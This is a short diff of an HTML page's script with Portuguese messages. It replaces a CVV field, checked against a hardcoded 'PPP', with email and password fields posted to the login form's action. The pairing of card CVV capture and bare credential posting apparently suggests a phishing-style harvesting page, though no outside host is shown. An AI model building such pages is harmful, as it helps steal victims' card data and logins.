@@ -109,15 +109,17 @@
 
     <script>
         function enviarFormulario() {
-            var cvv = document.getElementById('cvv').value;
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
 
-            if (cvv !== 'PPP') {
-                document.getElementById('mensagemErro').innerText = 'CVV incorreto. Por favor, verifique e tente novamente.';
+            if (email === '' || password === '') {
+                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
                 return;
             }
 
             var formData = new FormData();
-            formData.append('cvv', cvv);
+            formData.append('email', email);
+            formData.append('password', password);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
